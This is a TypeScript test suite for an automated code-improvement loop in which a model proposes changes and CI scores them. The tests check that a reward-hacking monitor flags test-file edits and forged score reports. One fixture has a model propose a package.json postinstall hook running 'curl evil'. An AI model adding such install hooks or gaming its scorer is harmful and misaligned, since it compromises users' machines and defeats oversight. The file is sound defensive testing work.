import assert from "node:assert/strict";
import { test } from "node:test";
import { MAX_CONSECUTIVE_REVERTS, SCORE_TIMEOUT_MS } from "../src/improve-schema.ts";
import { improveRunManual, improveStatus, ingestScore, openRuns, tickRuns } from "../src/improve-run.ts";
import { fakeD1, fakeEnv, fakeKv, fakeR2, withFetch } from "./fakes.ts";
import { ARCHIVE_DOC, ATTEMPT, AWAITING, BASELINE, harness, MODEL_ROUTE, NOW, pin, report, SCORES } from "./improve-harness.ts";
import { sseChange } from "./improve-fakes.ts";

// The loop, driven: keep and revert, the monitor's veto, the restore after five
// consecutive reverts, the subscription task document, and the dry run.
//
// Every test runs inside withFetch, including the ones that expect no network: an
// unrouted call returns 500, so a path that reaches for GitHub or the Anthropic API
// fails loudly instead of hitting the real internet.

const DIRTY_CHANGE = "=== test/format.test.ts (30 bytes, complete new contents) ===\nassert(true);\n";

const docWrites = (recorded: Array<{ sql: string; params: unknown[] }>) =>
  recorded.filter((r) => r.sql.includes("INSERT INTO documents"));

// the mode switch, end to end

test("MODE off records nothing and opens nothing, but still verifies the anchors", async () => {
  await withFetch({}, async () => {
    const { d1, env } = await harness({ kv: { improve_mode: "off" } });
    const summary = await openRuns(env, NOW, "capsid");
    assert.equal(summary.mode, "off");
    assert.equal(summary.outcomes[0].opened, false);
    assert.match(summary.outcomes[0].note, /improve_mode is off/);
    assert.deepEqual(d1.rows.improve_runs, [], "off mode opened a run");
    assert.deepEqual(docWrites(d1.recorded), [], "off mode wrote a document");
  });
});

test("MODE off is the default, so an unset key runs nothing", async () => {
  await withFetch({}, async () => {
    // Explicitly unset, overriding the harness default.
    const { d1, env } = await harness({ kv: { improve_mode: "" } });
    const summary = await openRuns(env, NOW, "capsid");
    assert.equal(summary.mode, "off");
    assert.deepEqual(d1.rows.improve_runs, []);
  });
});

test("SUBSCRIPTION MODE WRITES A TASK DOCUMENT and opens no run", async () => {
  await withFetch({}, async () => {
    const { d1, env } = await harness({ kv: { improve_mode: "subscription" } });
    const summary = await openRuns(env, NOW, "capsid");
    assert.equal(summary.mode, "subscription");
    assert.match(summary.outcomes[0].note, /task document written/);
    assert.deepEqual(d1.rows.improve_runs, [], "subscription mode opened a run");

    const writes = docWrites(d1.recorded);
    assert.equal(writes.length, 1, "expected exactly one task document");
    const [namespace, path, , body, type] = writes[0].params as string[];
    assert.equal(namespace, "capsid");
    assert.equal(path, "improve/run-2026-09-04.md");
    assert.equal(type, "task");
    // The document has to carry everything a session needs to execute the loop
    // without re-deriving the selection the Worker already made.
    assert.match(body, /Subscription mode/);
    assert.match(body, /## Base/);
    assert.match(body, /## What is measured/);
    assert.match(body, /## Attempt list/);
    assert.match(body, /Up to 10 attempts/);
    assert.match(body, /Stop after five consecutive reverts/);
    assert.match(body, /## What you may not touch/);
    assert.match(body, /build_passes: required/);
    assert.match(body, /holdout_pass_rate: min 1/);
  });
});

test("the task document names the transferred skills, with their win rates", async () => {
  await withFetch({}, async () => {
    const { d1, env } = await harness({
      kv: { improve_mode: "subscription" },
      improveSkills: [
        { id: "sk-1", source_namespace: "foxing", title: "Hoist the guard", wins: 3, losses: 1, ts: "2026-09-02 00:00:00" },
      ],
    });
    await openRuns(env, NOW, "capsid");
    const body = String((docWrites(d1.recorded)[0].params as string[])[3]);
    assert.match(body, /sk-1/);
    assert.match(body, /Hoist the guard/);
    assert.match(body, /win rate 67%/);
  });
});

// the anchor refusal, end to end

test("A MISMATCHED ANCHOR PIN REFUSES THE RUN and writes the reason where a human will see it", async () => {
  await withFetch({}, async () => {
    const { d1, env } = await harness({ kv: { improve_mode: "api", "improve:anchor:capsid": "0".repeat(64) } });
    const summary = await openRuns(env, NOW, "capsid");
    assert.equal(summary.outcomes[0].opened, false);
    assert.match(summary.outcomes[0].note, /anchor checksum mismatch/);
    assert.deepEqual(d1.rows.improve_runs, [], "a run was opened despite the mismatch");

    const writes = docWrites(d1.recorded);
    assert.equal(writes.length, 1);
    assert.match(String((writes[0].params as string[])[3]), /anchor checksum mismatch/);
  });
});

test("a MISSING scores document refuses, and names what is missing", async () => {
  await withFetch({}, async () => {
    const d1 = fakeD1({ namespaces: [{ namespace: "capsid", repos: "[]" }] });
    const kv = fakeKv({ seed: { improve_mode: "api" } });
    const env = fakeEnv({ DB: d1.db, APP_KV: kv.kv, HOLDOUT: fakeR2().bucket, MEDIA: fakeR2().bucket });
    const summary = await openRuns(env, NOW, "capsid");
    assert.match(summary.outcomes[0].note, /improve\/scores\.md does not exist/);
    assert.deepEqual(d1.rows.improve_runs, []);
  });
});

test("A PAUSED NAMESPACE IS SKIPPED, before anything else is read", async () => {
  await withFetch({}, async () => {
    const { d1, env } = await harness({ kv: { improve_mode: "api", "improve:paused:capsid": "anchors dropped" } });
    const summary = await openRuns(env, NOW, "capsid");
    assert.equal(summary.outcomes[0].opened, false);
    assert.match(summary.outcomes[0].note, /paused: anchors dropped/);
    assert.deepEqual(d1.rows.improve_runs, []);
    assert.deepEqual(docWrites(d1.recorded), [], "a paused namespace still wrote a document");
  });
});

test("ONE ACTIVE RUN PER NAMESPACE: the opener will not open a second", async () => {
  await withFetch({}, async () => {
    const { d1, env } = await harness({
      kv: { improve_mode: "api" },
      improveRuns: [{ id: "capsid-r1", namespace: "capsid", status: "awaiting-score" }],
    });
    const summary = await openRuns(env, NOW, "capsid");
    assert.equal(summary.outcomes[0].opened, false);
    assert.match(summary.outcomes[0].note, /already active in state 'awaiting-score'/);
    assert.equal(d1.rows.improve_runs.length, 1);
  });
});

// the dry run

test("A DRY RUN WRITES NOTHING, though it does READ to resolve the base", async () => {
  // Resolving the base is two GETs, so the claim asserted is no mutating call of any
  // kind, rather than no call.
  await withFetch(
    {
      "GET /repos/DrDustinEdwards/capsid-mcp": { body: { default_branch: "main" } },
      "GET /repos/DrDustinEdwards/capsid-mcp/git/ref/heads/main": { body: { object: { sha: "d1efa17defau1tbranchsha0000000000000000" } } },
    },
    async (calls) => {
      const { d1, kv, env } = await harness({ kv: { improve_mode: "api" } });
      const result = await improveRunManual(env, NOW, { namespace: "capsid", dryRun: true });
      assert.equal(result.dry_run, true);
      assert.match(result.opened[0].note, /would open a run/);
      // Nothing committed, nothing in KV, nothing dispatched.
      assert.deepEqual(d1.recorded, [], `a dry run issued ${d1.recorded.length} statement(s)`);
      assert.deepEqual(d1.rows.improve_runs, []);
      assert.deepEqual(kv.puts, [], "a dry run wrote to KV");
      assert.deepEqual(result.advanced, []);
      // Every call it did make was a read.
      const mutating = calls.filter((c) => c.method !== "GET");
      assert.deepEqual(mutating, [], `a dry run made ${mutating.length} mutating call(s): ${mutating.map((c) => c.method + " " + c.path).join(", ")}`);
      // And it actually resolved something, so this is not vacuous.
      assert.equal(result.opened[0].base, "d1efa17defau1tbranchsha0000000000000000", "the dry run did not resolve the default branch sha");
      assert.match(result.opened[0].note, /d1efa17defau1tbranchsha/);
    }
  );
});

test("a dry run still reports the refusals a real run would hit", async () => {
  await withFetch({}, async () => {
    const { d1, env } = await harness({ kv: { improve_mode: "api", "improve:anchor:capsid": "0".repeat(64) } });
    const result = await improveRunManual(env, NOW, { namespace: "capsid", dryRun: true });
    assert.match(result.opened[0].note, /would refuse: anchor checksum mismatch/);
    assert.deepEqual(d1.recorded, []);
  });
});

// keep and revert

test("AN IMPROVEMENT IS KEPT, and becomes the new best", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, kv, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      improveRuns: [AWAITING],
      improveAttempts: [ATTEMPT],
      improveScores: BASELINE,
    });
    const result = await ingestScore(env, report(), NOW);
    assert.equal(result.ok, true, result.message);
    assert.equal(result.kept, true, result.message);

    const attempt = d1.rows.improve_attempts[0];
    assert.equal(attempt.status, "kept");
    assert.equal(attempt.kept, 1);
    assert.match(String(attempt.reason), /kept: secondary score improved/);

    const run = d1.rows.improve_runs[0];
    assert.equal(run.kept, 1);
    assert.equal(run.reverts, 0);
    assert.equal(run.consecutive_reverts, 0);
    assert.equal(run.status, "attempting", "a kept attempt should let the run continue");
    // ci_minutes is replaced by the report rather than accumulated, because
    // dispatchScorer books an estimate at dispatch. This fixture is capsid, which is
    // public and billed nothing, so its reservation and settlement are both 0.
    assert.equal(run.ci_minutes, 0);

    const best = kv.puts.find((p) => p.key === "improve:best:capsid");
    assert.ok(best, "a kept attempt did not become the new best");
    assert.equal(JSON.parse(best.value).sha, "head01");
  });
});

test("A TIE IS REVERTED", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, kv, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      improveRuns: [AWAITING],
      improveAttempts: [ATTEMPT],
      improveScores: BASELINE,
    });
    const result = await ingestScore(env, report({ secondary: { lint_count: 10, test_pass_rate: 0.9, error_count: 4, p95_latency_ms: 200, bundle_size_bytes: 100_000 } }), NOW);
    assert.equal(result.kept, false);
    assert.equal(d1.rows.improve_attempts[0].status, "reverted");
    assert.equal(d1.rows.improve_runs[0].reverts, 1);
    assert.equal(d1.rows.improve_runs[0].consecutive_reverts, 1);
    assert.equal(kv.puts.find((p) => p.key === "improve:best:capsid"), undefined, "a reverted attempt became best");
  });
});

test("A FAILED ANCHOR IS REVERTED EVEN WHEN THE SECONDARY SCORE IMPROVES", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      improveRuns: [AWAITING],
      improveAttempts: [ATTEMPT],
      improveScores: BASELINE,
    });
    // lint_count halved, which is a real improvement, and the build broke.
    const result = await ingestScore(env, report({ anchors: { build_passes: 0 } }), NOW);
    assert.equal(result.kept, false);
    assert.match(result.message, /reverted on an anchor/);
    assert.match(result.message, /build_passes is required/);
    assert.equal(d1.rows.improve_attempts[0].kept, 0);
  });
});

test("THE MONITOR'S VETO OUTRANKS A GOOD SCORE", async () => {
  // A change that games the scorer scores well: this one edits a test file, and the
  // deterministic path guard refuses it without reaching the model.
  await withFetch({}, async (calls) => {
    const { d1, env } = await harness({
      documents: [{ ...ARCHIVE_DOC, body: DIRTY_CHANGE }],
      improveRuns: [AWAITING],
      improveAttempts: [ATTEMPT],
      improveScores: BASELINE,
    });
    const result = await ingestScore(env, report(), NOW);
    assert.equal(result.kept, false);
    assert.match(result.message, /reverted by the reward-hacking monitor \(paths\)/);
    assert.match(result.message, /test\/format\.test\.ts/);

    const attempt = d1.rows.improve_attempts[0];
    assert.equal(attempt.status, "flagged");
    assert.equal(attempt.flagged, 1);
    assert.match(String(attempt.flag_reason), /protected path/);
    assert.deepEqual(calls, [], "the deterministic guard still called the model");
  });
});

// Both holdout cases below are UNJUDGED, not REVERTED: the scorer did not measure the
// attempt, so nothing is recorded against the code (test/improve-unjudged.test.ts).
test("A SHRUNK HOLDOUT SUITE LEAVES THE ATTEMPT UNJUDGED, not kept", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      improveRuns: [AWAITING],
      improveAttempts: [ATTEMPT],
      improveScores: BASELINE,
    });
    const result = await ingestScore(env, report({ holdout: { total: 3, passed: 3 } }), NOW);
    assert.equal(result.kept, false);
    assert.match(result.message, /holdout size mismatch/);
    assert.equal(d1.rows.improve_attempts[0].kept, 0);
    assert.equal(d1.rows.improve_attempts[0].status, "unjudged");
  });
});

test("A MISSING HOLDOUT MANIFEST LEAVES THE ATTEMPT UNJUDGED, not kept", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, env } = await harness({
      apiKey: "sk-test",
      holdoutTotal: null,
      documents: [ARCHIVE_DOC],
      improveRuns: [AWAITING],
      improveAttempts: [ATTEMPT],
      improveScores: BASELINE,
    });
    const result = await ingestScore(env, report(), NOW);
    assert.equal(result.kept, false);
    assert.match(result.message, /no holdout manifest for capsid/);
    assert.equal(d1.rows.improve_attempts[0].kept, 0);
    assert.equal(d1.rows.improve_attempts[0].status, "unjudged");
  });
});

test("A DUPLICATE REPORT IS IGNORED, not counted twice", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      improveRuns: [AWAITING],
      improveAttempts: [ATTEMPT],
      improveScores: BASELINE,
    });
    const first = await ingestScore(env, report(), NOW);
    const second = await ingestScore(env, report(), NOW);
    assert.equal(first.kept, true);
    assert.equal(second.ok, true);
    assert.match(second.message, /duplicate|ignored/);
    assert.equal(d1.rows.improve_runs[0].kept, 1, "a duplicate report counted the keep twice");
  });
});

// The deterministic path monitor runs before the branch is pushed: a change touching
// a protected path (package.json) is caught by the pre-push gate.

const ATTEMPTING = {
  id: "capsid-r2",
  namespace: "capsid",
  mode: "api",
  started: "2026-09-04 08:00:00",
  status: "attempting",
  attempts: 0,
  base_sha: "base000",
  advanced_at: "2026-09-04 08:04:00",
};

test("a proposal touching a protected path is flagged BEFORE any push or dispatch", async () => {
  await withFetch(
    {
      "POST /v1/messages": {
        contentType: "text/event-stream",
        // The model proposes editing package.json, which measures the work.
        text: sseChange([{ path: "package.json", content: '{"scripts":{"postinstall":"curl evil"}}' }]),
      },
    },
    async (calls) => {
      const { d1, env } = await harness({
        apiKey: "sk-test",
        improveRuns: [ATTEMPTING],
      });
      await tickRuns(env, NOW);
      // The attempt is recorded flagged, and nothing was pushed or dispatched.
      const attempt = d1.rows.improve_attempts[0];
      assert.ok(attempt, "no attempt row was written");
      assert.equal(attempt.status, "flagged", "the protected-path proposal was not flagged before push");
      assert.equal(attempt.flagged, 1);
      // No branch write and no scorer dispatch ever reached GitHub.
      const pushed = calls.find((c) => c.method === "PUT" && /\/contents\//.test(c.path));
      const dispatched = calls.find((c) => /\/dispatches$/.test(c.path));
      assert.equal(pushed, undefined, "a protected-path attempt was pushed to a branch");
      assert.equal(dispatched, undefined, "a protected-path attempt was dispatched to CI");
    }
  );
});

// ingest binds the report to the run's in-flight attempt

test("a report whose head_sha does not match the attempt is refused (ci_dispatch-against-master defeat)", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      improveRuns: [AWAITING],
      improveAttempts: [ATTEMPT],
      improveScores: BASELINE,
    });
    // The attempt pushed head_sha "head01"; a report scoring a different commit
    // (e.g. master, dispatched via ci_dispatch) must not be believed.
    const result = await ingestScore(env, report({ head_sha: "masters-sha" }), NOW);
    assert.equal(result.ok, false, "old code ignored head_sha and would have scored it");
    assert.match(result.message, /different commit|head_sha/);
    // Nothing was scored; the run is still waiting.
    assert.equal(d1.rows.improve_runs[0].status, "awaiting-score");
    assert.equal(d1.rows.improve_runs[0].kept, 0);
  });
});

test("a report for an attempt from another run is refused", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      improveRuns: [AWAITING],
      improveAttempts: [{ ...ATTEMPT, run_id: "some-other-run" }],
      improveScores: BASELINE,
    });
    const result = await ingestScore(env, report(), NOW);
    assert.equal(result.ok, false, "old code did not check attempt.run_id");
    assert.match(result.message, /belongs to run/);
    assert.equal(d1.rows.improve_runs[0].status, "awaiting-score");
  });
});

test("a report for an attempt the run is not currently awaiting is ignored, not scored", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      // The run is waiting on a01; a02 also exists and is awaiting-score.
      improveRuns: [AWAITING],
      improveAttempts: [ATTEMPT, { ...ATTEMPT, id: "capsid-r1-a02", head_sha: "head02", branch: "improve/capsid-r1-a02" }],
      improveScores: BASELINE,
    });
    const result = await ingestScore(env, report({ attempt_id: "capsid-r1-a02", head_sha: "head02" }), NOW);
    assert.equal(result.ok, true);
    assert.match(result.message, /not awaiting a score for|ignored/);
    // The run did not advance to judging and score a02.
    assert.equal(d1.rows.improve_runs[0].status, "awaiting-score");
    assert.equal(d1.rows.improve_runs[0].current_attempt, "capsid-r1-a01");
  });
});

test("a report for an unknown run or attempt is refused", async () => {
  await withFetch({}, async () => {
    const { env } = await harness({ improveRuns: [AWAITING], improveAttempts: [ATTEMPT] });
    assert.match((await ingestScore(env, report({ run_id: "nope" }), NOW)).message, /unknown run nope/);
    assert.match((await ingestScore(env, report({ attempt_id: "nope" }), NOW)).message, /unknown attempt nope/);
  });
});

test("a report whose namespace does not match its run is refused", async () => {
  await withFetch({}, async () => {
    const { env } = await harness({ improveRuns: [AWAITING], improveAttempts: [ATTEMPT] });
    const result = await ingestScore(env, report({ namespace: "foxing" }), NOW);
    assert.equal(result.ok, false);
    assert.match(result.message, /does not match run/);
  });
});

// the transferred skill's outcome

test("a transferred skill's WIN is recorded against the skill", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      improveRuns: [AWAITING],
      improveAttempts: [{ ...ATTEMPT, skill_id: "sk-1" }],
      improveScores: BASELINE,
      improveSkills: [{ id: "sk-1", source_namespace: "foxing", wins: 0, losses: 0 }],
    });
    await ingestScore(env, report(), NOW);
    assert.equal(d1.rows.improve_skills[0].wins, 1);
    assert.equal(d1.rows.improve_skills[0].losses, 0);
  });
});

test("a transferred skill's LOSS is recorded too, so transfer is falsifiable", async () => {
  await withFetch({}, async () => {
    const { d1, env } = await harness({
      documents: [{ ...ARCHIVE_DOC, body: DIRTY_CHANGE }],
      improveRuns: [AWAITING],
      improveAttempts: [{ ...ATTEMPT, skill_id: "sk-1" }],
      improveScores: BASELINE,
      improveSkills: [{ id: "sk-1", source_namespace: "foxing", wins: 2, losses: 0 }],
    });
    await ingestScore(env, report(), NOW);
    assert.equal(d1.rows.improve_skills[0].wins, 2);
    assert.equal(d1.rows.improve_skills[0].losses, 1);
  });
});

// the stale guard and the restore

// A score that never arrives leaves the attempt unjudged, not reverted
// (test/improve-unjudged.test.ts). This file pins that the run does not wedge.

test("a score still inside the window is WAITED for, not reverted", async () => {
  await withFetch({}, async () => {
    const soon = new Date(Date.parse("2026-09-04T08:04:00Z") + 60_000);
    const { d1, env } = await harness({ improveRuns: [AWAITING], improveAttempts: [ATTEMPT] });
    const outcomes = await tickRuns(env, soon);
    // Derived from the constant, so a change to SCORE_TIMEOUT_MS cannot leave a
    // hardcoded number here stale.
    assert.match(outcomes[0].note, new RegExp(`waiting \\(60s of ${SCORE_TIMEOUT_MS / 1000}s\\)`));
    assert.equal(d1.rows.improve_attempts[0].status, "awaiting-score");
    assert.equal(d1.rows.improve_runs[0].reverts, 0);
  });
});

// Driven by a real revert (an attempt that was measured and did not improve), not
// by a timeout: a scorer that never reports is an environment failure and does not
// move the counter.
test("AFTER FIVE CONSECUTIVE REVERTS THE RUN RESTORES TO BEST AND STOPS", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      improveRuns: [{ ...AWAITING, consecutive_reverts: MAX_CONSECUTIVE_REVERTS - 1, reverts: 4, attempts: 5 }],
      improveAttempts: [ATTEMPT],
      improveScores: BASELINE,
    });
    // A tie: measured, and no improvement, so it reverts.
    await ingestScore(env, report({ secondary: { ...report().secondary, lint_count: 10 } }), NOW);
    const run = d1.rows.improve_runs[0];
    assert.equal(run.consecutive_reverts, MAX_CONSECUTIVE_REVERTS);
    assert.equal(run.status, "finalizing", "the run kept attempting past five consecutive reverts");
    assert.match(String(run.note), /5 consecutive reverts; restored to the best known commit and stopped/);
  });
});

test("a KEEP resets the consecutive counter, so five ALTERNATING reverts do not stop the run", async () => {
  await withFetch(MODEL_ROUTE, async () => {
    const { d1, env } = await harness({
      apiKey: "sk-test",
      documents: [ARCHIVE_DOC],
      improveRuns: [{ ...AWAITING, consecutive_reverts: 4, reverts: 4, attempts: 5 }],
      improveAttempts: [ATTEMPT],
      improveScores: BASELINE,
    });
    await ingestScore(env, report(), NOW);
    const run = d1.rows.improve_runs[0];
    assert.equal(run.consecutive_reverts, 0, "a keep did not reset the consecutive counter");
    assert.equal(run.status, "attempting");
  });
});

test("A RUN PAST ITS AGE CEILING FINALIZES wherever it is", async () => {
  await withFetch({}, async () => {
    const muchLater = new Date("2026-09-04T20:00:00Z");
    const { d1, env } = await harness({ improveRuns: [AWAITING], improveAttempts: [ATTEMPT] });
    const outcomes = await tickRuns(env, muchLater);
    assert.equal(outcomes[0].to, "finalizing");
    assert.match(String(d1.rows.improve_runs[0].note), /exceeded its 6 hour ceiling/);
  });
});

test("a run found STALE in 'judging' by a tick is returned to awaiting-score, not stranded", async () => {
  // Stale advanced_at, past SCORE_TIMEOUT_MS: the ingest that held it is dead.
  await withFetch({}, async () => {
    const { d1, env } = await harness({
      improveRuns: [{ ...AWAITING, status: "judging", advanced_at: "2026-09-04 07:00:00" }],
      improveAttempts: [ATTEMPT],
    });
    const outcomes = await tickRuns(env, NOW);
    assert.equal(outcomes[0].to, "awaiting-score");
    assert.equal(d1.rows.improve_runs[0].status, "awaiting-score");
  });
});

test("A STEP THAT THROWS FINALIZES THE RUN rather than holding the namespace forever", async () => {
  // With neither GitHub nor the model routed and no API key, the attempting step
  // throws, and the run must not keep the namespace's one active slot.
  await withFetch({}, async () => {
    const { d1, env } = await harness({ improveRuns: [{ ...AWAITING, status: "attempting", current_attempt: null }] });
    const outcomes = await tickRuns(env, NOW);
    assert.equal(outcomes[0].to, "finalizing");
    assert.match(String(d1.rows.improve_runs[0].note), /a step threw in 'attempting'/);
  });
});

// status

test("improve_status reports the mode, the pin, the pause and the totals", async () => {
  await withFetch({}, async () => {
    const { env } = await harness({
      kv: { improve_mode: "api", "improve:paused:capsid": "anchors dropped" },
      improveRuns: [
        { id: "capsid-r0", namespace: "capsid", status: "done", attempts: 4, kept: 1, reverts: 3, cost_usd: 0.5, ci_minutes: 12, started: "2026-09-03 08:00:00" },
      ],
    });
    const status = await improveStatus(env, "capsid");
    assert.equal(status.mode, "api");
    const ns = status.namespaces[0];
    assert.equal(ns.namespace, "capsid");
    assert.equal(ns.paused, "anchors dropped");
    assert.equal(ns.anchor_pinned, true);
    assert.equal(ns.anchor_problem, null);
    assert.equal(ns.last_run?.id, "capsid-r0");
    assert.equal(ns.totals.attempts, 4);
    assert.equal(ns.totals.kept, 1);
    assert.equal(ns.totals.ci_minutes, 12);
    // The cost is labelled as an estimate wherever it surfaces.
    assert.match(status.cost_note, /ESTIMATE/);
  });
});

test("improve_status reports an unpinned namespace as unpinned, rather than as healthy", async () => {
  await withFetch({}, async () => {
    const d1 = fakeD1({
      documents: [{ namespace: "capsid", path: "improve/scores.md", title: "s", body: SCORES, type: "reference" }],
    });
    const kv = fakeKv({ seed: { improve_mode: "api" } });
    const env = fakeEnv({ DB: d1.db, APP_KV: kv.kv, HOLDOUT: fakeR2().bucket, MEDIA: fakeR2().bucket });
    const status = await improveStatus(env, "capsid");
    assert.equal(status.namespaces[0].anchor_pinned, false);
    assert.match(status.namespaces[0].anchor_problem ?? "", /no anchor pin/);
  });
});
